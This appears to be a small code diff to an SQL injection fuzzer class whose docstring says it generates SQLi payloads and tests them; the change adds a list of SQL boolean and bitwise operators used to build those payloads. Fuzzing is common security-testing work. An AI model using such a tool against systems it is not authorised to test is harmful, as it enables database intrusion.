@@ -12,6 +12,17 @@ class SQLi(Fuzzer):
 
     """generate SQLi payload and test"""
 
+    bitOps = [
+        "or",
+        "||",
+        "and",
+        "&&",
+        "xor",
+        "|",
+        "not",
+        "!",
+    ]
+
     def __init__(self):
         super(SQLi, self).__init__()
 
